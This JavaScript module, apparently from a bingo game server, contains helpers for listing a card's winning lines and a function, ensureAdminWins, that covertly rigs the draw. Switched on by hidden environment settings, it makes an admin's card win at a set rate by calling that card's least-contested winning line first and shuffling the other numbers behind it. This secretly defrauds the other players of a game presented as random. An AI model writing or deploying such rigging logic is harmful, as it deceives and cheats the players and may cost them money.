// Port of bingo/checker.py — admin bias for call sequence
const { getCard } = require('./utils');

function flatten(rows) {
    const out = [];
    for (const r of rows) {
        for (const v of r) {
            if (v === 'FREE') continue;
            out.push(Number(v));
        }
    }
    return out;
}

function winningLines(rows) {
    const lines = [];
    // rows
    for (let r = 0; r < 5; r++) {
        const line = [];
        for (let c = 0; c < 5; c++) if (rows[r][c] !== 'FREE') line.push(rows[r][c]);
        lines.push(line);
    }
    // cols
    for (let c = 0; c < 5; c++) {
        const line = [];
        for (let r = 0; r < 5; r++) if (rows[r][c] !== 'FREE') line.push(rows[r][c]);
        lines.push(line);
    }
    // diag main
    {
        const line = [];
        for (let i = 0; i < 5; i++) if (rows[i][i] !== 'FREE') line.push(rows[i][i]);
        lines.push(line);
    }
    // diag anti
    {
        const line = [];
        for (let i = 0; i < 5; i++) if (rows[i][4 - i] !== 'FREE') line.push(rows[i][4 - i]);
        lines.push(line);
    }
    // four corners
    lines.push([rows[0][0], rows[0][4], rows[4][0], rows[4][4]]);
    return lines;
}

function ensureAdminWins(game, adminIndex, allSelections) {
    const adminTid = process.env.ADMIN_TID;
    const adminRate = parseFloat(process.env.ADMIN_WIN_RATE || '0');
    if (!adminTid || adminRate <= 0 || !adminIndex) return null;
    if (Math.random() > adminRate) return null;

    const adminCard = getCard(adminIndex);
    const adminLines = winningLines(adminCard);

    // Collect all numbers from other players' cards
    const otherNumbers = new Set();
    for (const sel of allSelections) {
        if (sel.index === adminIndex) continue;
        const card = getCard(sel.index);
        flatten(card).forEach((n) => otherNumbers.add(n));
    }

    // Find the best admin winning line (fewest numbers shared with opponents)
    let bestLine = null;
    let bestShared = Infinity;
    for (const line of adminLines) {
        const shared = line.filter((n) => otherNumbers.has(n)).length;
        if (shared < bestShared) {
            bestShared = shared;
            bestLine = line;
        }
    }
    if (!bestLine) return null;

    // Build sequence: admin winning numbers first, then others shuffled
    const adminSet = new Set(bestLine);
    const allNums = [];
    for (let i = 1; i <= 75; i++) allNums.push(i);
    const rest = allNums.filter((n) => !adminSet.has(n));
    // Shuffle rest
    for (let i = rest.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [rest[i], rest[j]] = [rest[j], rest[i]];
    }
    return [...bestLine, ...rest];
}

module.exports = { ensureAdminWins, winningLines, flatten };
